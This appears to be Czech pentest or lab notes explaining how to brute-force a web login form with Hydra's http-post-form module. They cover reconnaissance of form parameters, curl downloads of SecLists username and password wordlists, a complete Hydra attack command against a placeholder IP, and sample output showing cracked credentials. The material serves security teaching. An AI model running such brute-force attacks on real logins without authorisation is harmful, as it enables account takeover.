## 🌐 Přihlašovací formuláře a HTTP POST

Na rozdíl od HTTP Basic Auth používají běžné webové aplikace HTML formuláře. Ty odesílají přihlašovací údaje v těle HTTP **POST** požadavku, nejčastěji zakódované jako `application/x-www-form-urlencoded`.

### Klasický příklad HTTP POST požadavku:

HTTP

```
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

username=admin&password=secret123
```

## 🔍 Fáze průzkumu (Reconnaissance)

Před spuštěním nástroje Hydra je nutné zjistit přesné parametry přihlašovacího formuláře pomocí **Developer Tools v prohlížeči (F12)** nebo proxy nástroje (**Burp Suite / OWASP ZAP**):

1. **Cesta (Path):** Kam se formulář odesílá (např. `/` nebo `/login.php`).
    
2. **Názvy polí (Parameters):** Jak se jmenují vstupy pro uživatele a heslo (např. `username` a `password`).
    
3. **Podmínka vyhodnocení (Condition String):** Jak aplikace reaguje na chybné vs. úspěšné přihlášení.
    

## 🐉 Modul `http-post-form` v Hydře

Modul `http-post-form` vyžaduje řetězec definovaný ve třech částech oddělených dvojtečkou:

$$\text{"cesta : parametry : podmínka"}$$

### 1. Rozbor vlastního řetězce

Plaintext

```
"/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

- **Cesta (`/`):** URL endpoint, kam formulář posílá data.
    
- **Parametry (`username=^USER^&password=^PASS^`):** Tělo požadavku. Zástupné znaky `^USER^` a `^PASS^` Hydra nahrazuje položkami ze slovníků.
    
- **Podmínka neúspěchu / úspěchu:**
    
    - **`F=Invalid credentials` (Failure):** Pokud odpověď serveru obsahuje text _"Invalid credentials"_, Hydra pokus vyhodnotí jako **neúspěšný** a pokračuje dále.
        
    - **`S=302` nebo `S=Dashboard` (Success):** Pokus je vyhodnocen jako **úspěšný**, pokud server vrátí přesměrování (kód 302) nebo text _"Dashboard"_.
        

## 🛠️ Praktický příkaz a spuštění

Pokud máme připravené wordlisty pro jména i hesla, spustíme Hydru následovně:

Bash

```
# 1. Stáhnutí potřebných wordlistů (SecLists)
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

# 2. Spuštění Hydra útoku na port 5000
hydra -L top-usernames-shortlist.txt \
      -P 2023-200_most_used_passwords.txt \
      -f <IP_ADRESA> -s 5000 \
      http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

### Přehled použitých přepínačů:

|**Přepínač**|**Význam**|
|---|---|
|**`-L`**|Cesta k souboru se seznamem uživatelských jmen.|
|**`-P`**|Cesta k souboru se seznamem hesel.|
|**`-f`**|Zastaví útok ihned po nalezení první platné dvojice.|
|**`-s 5000`**|Určuje cílový port (zde port 5000).|
|**`http-post-form`**|Určuje modul pro brute-force HTTP POST formulářů.|

### 🏆 Výsledek

Po úspěšném dokončení Hydra vypíše nalezenou dvojici přihlašovacích údajů:

Plaintext

```
[5000][http-post-form] host: <IP_ADRESA>   login: admin   password: <NALEZENÉ_HESLO>
1 of 1 target successfully completed, 1 valid password found
```